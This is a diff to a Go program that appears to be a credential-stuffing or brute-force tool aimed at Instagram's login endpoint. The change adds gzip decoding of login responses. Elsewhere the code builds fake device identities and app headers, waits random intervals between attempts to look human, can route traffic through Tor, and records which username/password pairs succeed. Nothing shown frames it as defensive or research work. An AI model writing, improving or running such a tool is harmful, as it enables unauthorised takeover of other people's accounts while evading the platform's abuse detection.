@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"compress/gzip"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -15,7 +16,6 @@ import (
 	"strings"
 	"sync"
 	"time"
-
 	"golang.org/x/net/proxy"
 )
 
@@ -124,7 +124,6 @@ func main() {
 					}
 					return
 				}
-				// Sleep random (rate limit, more human)
 				time.Sleep(randomDuration(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
 			}
 		}()
@@ -269,7 +268,7 @@ func buildHeaders(dev deviceInfo) map[string]string {
 		"Content-Type":              "application/x-www-form-urlencoded; charset=UTF-8",
 		"Accept":                    "*/*",
 		"Accept-Language":           "en-US",
-		"Accept-Encoding":           "gzip, deflate, br",
+		"Accept-Encoding":           "gzip, deflate, br", // <--- gzip enabled
 		"X-IG-Capabilities":         "3brTvw==",
 		"X-IG-Connection-Type":      "WIFI",
 		"X-IG-App-ID":               IG_APP_ID,
@@ -306,14 +305,15 @@ type LoginResult struct {
 func tryLogin(username, password string, useTor bool) LoginResult {
 	loginUrl := API_URL + "accounts/login/"
 	dev := randomDeviceInfo()
-        data := url.Values{}
-        data.Set("username", username)
-        data.Set("enc_password", fmt.Sprintf("#PWD_INSTAGRAM_BROWSER:0:%d:%s", time.Now().Unix(), password))
-        data.Set("device_id", dev.deviceID)
-        data.Set("uuid", dev.guid)
-        data.Set("adid", dev.adid)
-        data.Set("phone_id", dev.phoneID)
-        data.Set("login_attempt_count", fmt.Sprintf("%d", rand.Intn(3)))
+	data := url.Values{}
+	// IMPORTANT: Use enc_password for Instagram login
+	data.Set("username", username)
+	data.Set("enc_password", fmt.Sprintf("#PWD_INSTAGRAM_BROWSER:0:%d:%s", time.Now().Unix(), password))
+	data.Set("device_id", dev.deviceID)
+	data.Set("uuid", dev.guid)
+	data.Set("adid", dev.adid)
+	data.Set("phone_id", dev.phoneID)
+	data.Set("login_attempt_count", fmt.Sprintf("%d", rand.Intn(3)))
 
 	var client *http.Client
 	if useTor {
@@ -348,7 +348,21 @@ func tryLogin(username, password string, useTor bool) LoginResult {
 	}
 	defer resp.Body.Close()
 
-	body, err := io.ReadAll(resp.Body)
+	var reader io.Reader
+	if resp.Header.Get("Content-Encoding") == "gzip" {
+		gzipr, err := gzip.NewReader(resp.Body)
+		if err != nil {
+			log.Printf("Error reading gzip response: %v\n", err)
+			fmt.Println("Error reading gzip response:", err)
+			return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Gzip read error"}
+		}
+		defer gzipr.Close()
+		reader = gzipr
+	} else {
+		reader = resp.Body
+	}
+
+	body, err := io.ReadAll(reader)
 	if err != nil {
 		log.Printf("Error reading response: %v\n", err)
 		fmt.Println("Error reading response:", err)
@@ -358,7 +372,6 @@ func tryLogin(username, password string, useTor bool) LoginResult {
 	bodyStr := strings.TrimSpace(string(body))
 	log.Printf("Raw response: %s\n", bodyStr)
 
-	// If not JSON, print error and return
 	if !strings.HasPrefix(bodyStr, "{") {
 		log.Printf("Non-JSON response: %s\n", bodyStr)
 		fmt.Println("Non-JSON response:", bodyStr)
